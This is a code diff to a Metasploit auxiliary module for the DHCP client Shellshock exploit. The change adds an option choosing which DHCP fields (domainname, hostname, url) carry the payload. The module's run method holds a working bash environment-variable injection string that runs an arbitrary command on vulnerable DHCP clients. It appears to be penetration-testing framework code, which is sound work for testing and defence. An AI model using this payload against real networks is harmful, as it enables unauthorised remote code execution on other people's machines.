@@ -6,7 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::DHCPServer
 
-  def initialize()
+  def initialize
     super(
       'Name' => 'DHCP Client Bash Environment Variable Code Injection (Shellshock)',
       'Description' => %q{
@@ -50,17 +50,53 @@ class MetasploitModule < Msf::Auxiliary
       ]
     )
 
+    register_advanced_options(
+      [
+        OptString.new(
+          'SHELLSHOCK_DHCP_VARS',
+          [
+            true,
+            'DHCP variables to poison (comma-separated: domainname, hostname, url)',
+            'domainname,hostname,url'
+          ]
+        )
+      ]
+    )
+
     deregister_options('DOMAINNAME', 'HOSTNAME', 'URL')
+  end
+
+  def dhcp_vars
+    vars = datastore['SHELLSHOCK_DHCP_VARS'].to_s.split(',').map(&:strip)
+    invalid = vars - %w[domainname hostname url]
+    fail_with(Failure::BadConfig, "Invalid SHELLSHOCK_DHCP_VARS: #{invalid.join(', ')}") unless invalid.empty?
+    vars
+  end
+
+  def build_dhcp_vars(value)
+    vars = {}
+
+    dhcp_vars.each do |var|
+      vprint_status("Injecting into: DHCP #{var}")
+      case var
+      when 'domainname'
+        vars['DOMAINNAME'] = value
+      when 'hostname'
+        vars['HOSTNAME'] = value
+      when 'url'
+        vars['URL'] = value
+      end
+    end
+
+    vars
   end
 
   def run
     value = "() { :;};PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin #{datastore['CMD']}"
 
-    start_service(datastore.merge({
-      'DOMAINNAME' => value,
-      'HOSTNAME' => value,
-      'URL' => value
-    }))
+    start_service(
+      datastore.merge(build_dhcp_vars(value))
+    )
 
     # Wait for finish
     sleep 2 while @dhcp&.thread&.alive?
